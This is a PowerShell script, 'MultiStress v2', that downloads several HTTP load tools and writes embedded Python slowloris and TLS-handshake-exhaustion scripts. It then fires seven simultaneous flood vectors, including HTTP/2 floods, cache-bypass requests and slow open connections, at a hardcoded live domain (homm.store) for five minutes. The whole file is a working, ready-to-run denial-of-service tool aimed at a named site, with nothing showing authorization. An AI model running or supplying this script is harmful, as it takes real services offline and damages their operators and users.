# MultiStress v2 — Windows, no proxy
# Run: .\run-windows.ps1

$Target      = "https://homm.store"
$TargetHost  = "homm.store"
$TargetPort  = 443
$Duration    = 300
$Workers     = 400
$BinDir      = "$PSScriptRoot\bin"
$LogDir      = "$env:TEMP\multistress_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
$Jobs        = @()

$ErrorActionPreference = "Continue"

function Write-Log  { param($msg) Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] $msg" -ForegroundColor White }
function Write-Ok   { param($msg) Write-Host "  [OK] $msg" -ForegroundColor Green }
function Write-Warn { param($msg) Write-Host "  [WARN] $msg" -ForegroundColor Yellow }

# ── Download binary from GitHub releases ──────────────────────────────────────
function Get-GithubBinary {
  param($Repo, $AssetPattern, $OutName)
  $dest = "$BinDir\$OutName"
  if (Test-Path $dest) { return $dest }

  Write-Log "Downloading $OutName from $Repo..."
  try {
    $rel = Invoke-RestMethod "https://api.github.com/repos/$Repo/releases/latest"
    $asset = $rel.assets | Where-Object { $_.name -like $AssetPattern } | Select-Object -First 1
    if (-not $asset) { Write-Warn "No asset matching '$AssetPattern' in $Repo"; return $null }

    $tmp = "$env:TEMP\$($asset.name)"
    Invoke-WebRequest $asset.browser_download_url -OutFile $tmp -UseBasicParsing

    if ($tmp -like "*.zip") {
      Expand-Archive $tmp -DestinationPath "$env:TEMP\ms_extract" -Force
      $exe = Get-ChildItem "$env:TEMP\ms_extract" -Filter $OutName -Recurse | Select-Object -First 1
      if ($exe) { Copy-Item $exe.FullName $dest }
      Remove-Item "$env:TEMP\ms_extract" -Recurse -Force -ErrorAction SilentlyContinue
    } else {
      Copy-Item $tmp $dest
    }
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    Write-Ok "$OutName ready"
    return $dest
  } catch {
    Write-Warn "Failed to download $OutName`: $_"
    return $null
  }
}

# ── Install all tools ──────────────────────────────────────────────────────────
function Install-Tools {
  Write-Log "Checking dependencies..."
  New-Item -ItemType Directory -Force -Path $BinDir | Out-Null

  # Python check
  if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Warn "Python not found. Install from python.org or Microsoft Store."
  } else {
    python -m pip install -q PySocks 2>$null
  }

  $script:Bombardier = Get-GithubBinary "codesenberg/bombardier" "bombardier-windows-amd64.exe" "bombardier.exe"
  $script:Hey        = Get-GithubBinary "rakyll/hey"             "hey_windows_amd64"            "hey.exe"
  $script:Vegeta     = Get-GithubBinary "tsenart/vegeta"         "vegeta_*_windows_amd64.zip"   "vegeta.exe"
  $script:Fortio     = Get-GithubBinary "fortio/fortio"          "fortio_win_*_amd64.zip"       "fortio.exe"

  Write-Ok "Setup complete"
}

# ── Embedded Python helpers ────────────────────────────────────────────────────
function Write-Helpers {
  @'
import socket, ssl, time, threading, signal, sys, random, string
HOST, PORT, COUNT, TIMEOUT = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
sockets=[]; lock=threading.Lock(); stop=threading.Event()
def make_sock():
    s=socket.socket(); s.settimeout(4)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s=ctx.wrap_socket(s,server_hostname=HOST); s.connect((HOST,PORT)); return s
def rand(n): return ''.join(random.choices(string.ascii_letters,k=n))
def open_all():
    for _ in range(COUNT):
        if stop.is_set(): break
        try:
            s=make_sock(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            with lock: sockets.append(s)
        except: pass
    print(f"[slowloris] Opened {len(sockets)}",flush=True)
def keep():
    start=time.time()
    while not stop.is_set() and time.time()-start<TIMEOUT:
        dead=[]
        with lock:
            for i,s in enumerate(sockets):
                try: s.send(f"X-A: {rand(6)}\r\n".encode())
                except: dead.append(i)
            for i in reversed(dead): sockets.pop(i)
        for _ in range(len(dead)):
            try:
                s=make_sock(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
                with lock: sockets.append(s)
            except: pass
        print(f"[slowloris] alive={len(sockets)} dropped={len(dead)}",flush=True); time.sleep(10)
import signal as _s; _s.signal(_s.SIGTERM, lambda *_: stop.set())
open_all(); keep()
'@ | Set-Content "$env:TEMP\slowloris.py" -Encoding UTF8

  @'
import ssl,socket,time,threading,signal,sys
HOST,PORT,THREADS,TIMEOUT=sys.argv[1],int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4])
stop=threading.Event(); count=[0]; lock=threading.Lock()
def loop():
    while not stop.is_set():
        try:
            s=socket.socket(); s.settimeout(3)
            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            w=ctx.wrap_socket(s,server_hostname=HOST); w.connect((HOST,PORT)); w.close()
            with lock: count[0]+=1
        except: pass
signal.signal(signal.SIGTERM,lambda *_: stop.set())
ts=[threading.Thread(target=loop,daemon=True) for _ in range(THREADS)]
for t in ts: t.start()
start=time.time()
while time.time()-start<TIMEOUT and not stop.is_set():
    print(f"[ssl_exhaustion] {int(time.time()-start)}s handshakes={count[0]}",flush=True); time.sleep(5)
stop.set(); print(f"[ssl_exhaustion] Done. Total: {count[0]}",flush=True)
'@ | Set-Content "$env:TEMP\ssl_exhaustion.py" -Encoding UTF8
}

# ── Progress bar ───────────────────────────────────────────────────────────────
function Show-Progress {
  param($StartTime, $DurationSec)
  while ($true) {
    $el  = [int]([datetime]::Now - $StartTime).TotalSeconds
    $pct = [Math]::Min([int]($el * 100 / $DurationSec), 100)
    $f   = [int]($pct * 40 / 100)
    $bar = ("#" * $f) + ("-" * (40 - $f))
    Write-Host "`r[$bar] $pct% ${el}s/$($DurationSec)s" -NoNewline -ForegroundColor Cyan
    if ($el -ge $DurationSec) { break }
    Start-Sleep -Seconds 2
  }
  Write-Host ""
}

# ── Run all vectors ────────────────────────────────────────────────────────────
function Start-AllVectors {
  New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
  Write-Helpers

  $startTime = [datetime]::Now
  $bust = Get-Random -Minimum 1 -Maximum 9999999

  Write-Log "Launching 7 vectors on $Target | workers=$($Workers*4) | duration=${Duration}s`n"

  # 1. Bombardier
  if ($script:Bombardier) {
    Write-Host "[1/7 BOMBARDIER]   HTTP/2 flood" -ForegroundColor Red
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t)
      & $bin -c $w -d "${d}s" -t 1500ms --http2 --insecure -l $t 2>&1
    } -ArgumentList $script:Bombardier,$Workers,$Duration,$Target
    $script:Jobs += $j
    $j | Out-File "$LogDir\bombardier_jobid.txt"
  }

  # 2. Hey
  if ($script:Hey) {
    Write-Host "[2/7 HEY]          HTTP/1.1 keep-alive" -ForegroundColor Green
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t) & $bin -c $w -z "${d}s" $t 2>&1
    } -ArgumentList $script:Hey,$Workers,$Duration,$Target
    $script:Jobs += $j
  }

  # 3. Vegeta
  if ($script:Vegeta) {
    Write-Host "[3/7 VEGETA]       Constant-rate flood" -ForegroundColor Yellow
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t)
      "GET $t" | & $bin attack -rate=0 "-max-workers=$w" "-duration=${d}s" -insecure |
        & $bin report -every=10s 2>&1
    } -ArgumentList $script:Vegeta,$Workers,$Duration,$Target
    $script:Jobs += $j
  }

  # 4. Fortio
  if ($script:Fortio) {
    Write-Host "[4/7 FORTIO]       Latency-aware flood" -ForegroundColor Cyan
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t) & $bin load -c $w -t "${d}s" -qps 0 -insecure $t 2>&1
    } -ArgumentList $script:Fortio,$Workers,$Duration,$Target
    $script:Jobs += $j
  }

  # 5. Slowloris
  Write-Host "[5/7 SLOWLORIS]    Slow open connections" -ForegroundColor Magenta
  $j = Start-Job -ScriptBlock {
    param($h,$p,$d) python "$env:TEMP\slowloris.py" $h $p 200 $d 2>&1
  } -ArgumentList $TargetHost,$TargetPort,$Duration
  $script:Jobs += $j

  # 6. SSL Exhaustion
  Write-Host "[6/7 SSL_EXHAUST]  TLS handshake flood" -ForegroundColor Blue
  $j = Start-Job -ScriptBlock {
    param($h,$p,$d) python "$env:TEMP\ssl_exhaustion.py" $h $p 100 $d 2>&1
  } -ArgumentList $TargetHost,$TargetPort,$Duration
  $script:Jobs += $j

  # 7. Cache Bypass
  if ($script:Hey) {
    Write-Host "[7/7 CACHE_BYPASS] Random query string" -ForegroundColor Red
    $j = Start-Job -ScriptBlock {
      param($bin,$w,$d,$t,$bust)
      & $bin -c $w -z "${d}s" -H "Cache-Control: no-cache" -H "Pragma: no-cache" "${t}?bust=${bust}" 2>&1
    } -ArgumentList $script:Hey,$Workers,$Duration,$Target,$bust
    $script:Jobs += $j
  }

  Write-Host "`nLogs: $LogDir | Ctrl+C to stop`n"

  # Live output from all jobs
  $liveJob = Start-Job -ScriptBlock {
    param($jobs, $logDir)
    while ($true) {
      foreach ($j in $jobs) {
        $out = Receive-Job $j -Keep 2>$null
        if ($out) { $out[-([Math]::Min(3,$out.Count))..-1] | ForEach-Object { Write-Output $_ } }
      }
      Start-Sleep -Milliseconds 500
    }
  } -ArgumentList $script:Jobs,$LogDir
  $script:Jobs += $liveJob

  Show-Progress -StartTime $startTime -DurationSec $Duration

  Write-Host "`n`n[OK] Done. Collecting results..." -ForegroundColor Green
  Start-Sleep -Seconds 2

  Write-Host "`n=== SUMMARY ===" -ForegroundColor White
  foreach ($j in $script:Jobs) {
    $out = Receive-Job $j 2>$null
    if ($out) { $out | Select-Object -Last 8 | ForEach-Object { Write-Host $_ } }
  }

  Write-Host "`nFull logs: $LogDir\" -ForegroundColor Cyan
}

# ── Cleanup ────────────────────────────────────────────────────────────────────
function Stop-All {
  Write-Host "`nStopping all jobs..." -ForegroundColor Red
  $script:Jobs | ForEach-Object { Stop-Job $_ -ErrorAction SilentlyContinue; Remove-Job $_ -Force -ErrorAction SilentlyContinue }
}

try {
  Write-Host "`n>> MULTISTRESS v2 -- Windows -- no proxy`n" -ForegroundColor Red
  Install-Tools
  Start-AllVectors
} finally {
  Stop-All
}
